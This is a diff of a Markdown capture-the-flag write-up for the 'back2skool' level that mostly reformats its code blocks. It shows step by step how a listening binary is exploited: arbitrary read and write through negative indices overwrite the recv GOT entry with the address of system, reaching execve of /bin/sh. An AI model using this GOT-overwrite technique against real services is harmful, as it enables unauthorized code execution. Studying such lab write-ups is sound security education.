@@ -18,19 +18,19 @@ will also describe the steps for solving the mentioned CTF level using the
 # Hello binary!
 Let's start by inspecting the binary.
 
-* 32bit dynamically linked binary
+It is a 32bit dynamically linked binary
 
-    	$ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-    	./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...
+    $ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
+    ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...
 
-* it waits for connections on port 31337
+Which waits for connections on port 31337
 
-    	$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-    		[...]
-    	setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
-    	bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
-    	listen(3, 20)                           = 0
-    	accept(3, 
+    $ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
+    	[...]
+    setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+    bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+    listen(3, 20)                           = 0
+    accept(3,
 
 `SO_REUSEADDR` is used, just for *easy* debugging ;-) - it allows other
 sockets to `bind()` this port; no more getting the annoying error *Address
@@ -396,9 +396,11 @@ compute the offset of an unused function**.
   function which has been previously called. We will choose `recv` for this
   purpose.
 
-		$ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
-		08048980 <recv@plt>:
-		 8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0
+~~~ bash
+$ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
+08048980 <recv@plt>:
+ 8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0
+~~~
 
 **0x804bfc0** is the GOT entry for `recv` function.
 
@@ -409,12 +411,14 @@ compute the offset of an unused function**.
   exploiting locally - meaning that we have access to our libc file. To
   compute the offset we only have to find the function entries in libc.
 
-		$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' recv@'
-		  1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
-		$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' system@'
-		  1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
-		$ echo $((0x00039100-0x000cebf0))
-		-613104
+~~~ bash
+$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' recv@'
+  1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
+$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' system@'
+  1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+$ echo $((0x00039100-0x000cebf0))
+-613104
+~~~
 
 The offset is -613104, **note** that it depends on the version of libc, hence
 the exploit isn't too reliable. Let's focus though on exploiting locally and
@@ -422,41 +426,45 @@ postpone the computation of the remote offset. We will write at the same
 address as in PoC1 but we will write the value of `system` function i.e.
 `address_of_recv_function+OFFSET`.
 
-	$ telnet localhost 31337
-	read
-	Input position to read from:
-	-32
-	Value at position -32: -1217696784
-	write
-	Input position to write to:
-	-2147483634
-	Input numeric value to write:
-	-1218309888
-	Value at position -2147483634: -1218309888
-	math
-	Result of math: -1
+~~~ bash
+$ telnet localhost 31337
+read
+Input position to read from:
+-32
+Value at position -32: -1217696784
+write
+Input position to write to:
+-2147483634
+Input numeric value to write:
+-1218309888
+Value at position -2147483634: -1218309888
+math
+Result of math: -1
+~~~
 
-Reading from **-32** it's equivalent of reading -32\*4 bytes before our
-buffer. 0x804c040-32\*4 is 0x804bfc0, this is the `recv` GOT entry.
-**-1218309888** is -1217696784-613104.
+Reading from `-32` it's equivalent of reading `-32*4` bytes before our
+buffer. `0x804c040-32*4` is `0x804bfc0`, this is the `recv` GOT entry.
+`-1218309888` is `-1217696784-613104`.
 
 Hey, it didn't crashed, that's a plus! Meanwhile, back at the castle.
 
-	$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-	[...]
-	[pid  4901] send(4, "Value at position -2147483634: -"..., 43, 0) = 43
-	[pid  4901] read(4, "m", 1)             = 1
-	[pid  4901] read(4, "a", 1)             = 1
-	[pid  4901] read(4, "t", 1)             = 1
-	[pid  4901] read(4, "h", 1)             = 1
-	[pid  4901] read(4, "\r", 1)            = 1
-	[pid  4901] read(4, "\n", 1)            = 1
-	[...]
-	[pid  4902] execve("/bin/sh", ["sh", "-c", ""], [/* 31 vars */]) = 0
-	[pid  4902] brk(0)                      = 0x9a04000
-	[...]
+~~~ bash
+$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
+[...]
+[pid  4901] send(4, "Value at position -2147483634: -"..., 43, 0) = 43
+[pid  4901] read(4, "m", 1)             = 1
+[pid  4901] read(4, "a", 1)             = 1
+[pid  4901] read(4, "t", 1)             = 1
+[pid  4901] read(4, "h", 1)             = 1
+[pid  4901] read(4, "\r", 1)            = 1
+[pid  4901] read(4, "\n", 1)            = 1
+[...]
+[pid  4902] execve("/bin/sh", ["sh", "-c", ""], [/* 31 vars */]) = 0
+[pid  4902] brk(0)                      = 0x9a04000
+[...]
+~~~
 
-We successfully **called execve**!
+We successfully **called `execve`**!
 
 ## Parameters to execve
 
